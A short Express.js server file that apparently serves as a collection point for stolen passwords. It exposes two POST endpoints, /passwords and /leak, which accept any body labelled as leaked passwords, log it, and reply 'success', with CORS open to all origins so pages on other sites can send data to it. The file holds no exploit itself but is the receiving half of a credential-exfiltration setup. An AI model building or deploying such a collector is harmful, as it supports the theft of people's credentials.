import express from "express";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

app.post("/passwords", (req, res) => {
    const leakedPasswords = req.body;
    console.log(leakedPasswords);
    res.send("success");
});

app.post("/leak", (req, res) => {
    const leakedPasswords = req.body;
    console.log(leakedPasswords);
    res.send("success");
});

const PORT = 8080;
export function start() {
    app.listen(PORT, () => {
        console.log(`server started on ${PORT}`);
    });
}
